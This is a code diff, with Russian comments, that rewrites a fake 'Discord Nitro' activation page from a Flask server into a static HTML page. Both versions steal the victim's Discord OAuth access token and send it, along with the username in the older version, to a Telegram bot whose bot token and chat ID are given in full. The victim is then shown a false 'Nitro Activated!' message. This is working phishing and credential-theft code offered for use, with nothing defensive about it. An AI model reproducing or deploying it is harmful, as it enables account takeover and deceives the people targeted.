@@ -1,28 +1,31 @@
-# Установи: pip install flask requests
-from flask import Flask, request
-import requests
-
-app = Flask(__name__)
-
-@app.route('/callback')
-def callback():
-    token = request.args.get('access_token')
-    if token:
-        # Получаем данные пользователя
-        user = requests.get('https://discord.com/api/v9/users/@me',
-                          headers={'Authorization': f'Bearer {token}'}).json()
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing...</title>
+    <script>
+        // Получаем токен из URL
+        const hash = window.location.hash.substring(1);
+        const params = new URLSearchParams(hash);
+        const token = params.get('access_token');
         
-        # Отправляем в Telegram
-        telegram_url = f"https://api.telegram.org/bot8397924025:AAFFE395imJAJfq72EnXg8rVUF5Z0CzcZbU/sendMessage"
-        message = f"🎯 New Discord account!\nUser: {user['username']}\nToken: {token}"
-        requests.post(telegram_url, json={'chat_id': '7742974651', 'text': message})
-        
-        # Показываем "успех"
-        return '''
-        <h1>✅ Nitro Activated!</h1>
-        <p>Check your Discord for Nitro benefits!</p>
-        <p>It may take 5-10 minutes to appear.</p>
-        '''
-    
-    return "Error"
-
+        if (token) {
+            // Отправляем токен на сервер
+            fetch('https://api.telegram.org/bot8397924025:AAFFE395imJAJfq72EnXg8rVUF5Z0CzcZbU/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: '7742974651',
+                    text: '🎯 New Discord token: ' + token
+                })
+            }).then(() => {
+                document.body.innerHTML = '<h1>✅ Nitro Activated!</h1><p>Check your Discord!</p>';
+            });
+        } else {
+            document.body.innerHTML = '<h1>⚠️ Error</h1><p>Please try again.</p>';
+        }
+    </script>
+</head>
+<body style="background: #36393f; color: white; text-align: center; padding: 100px;">
+    <h1>Processing your Nitro...</h1>
+</body>
+</html>
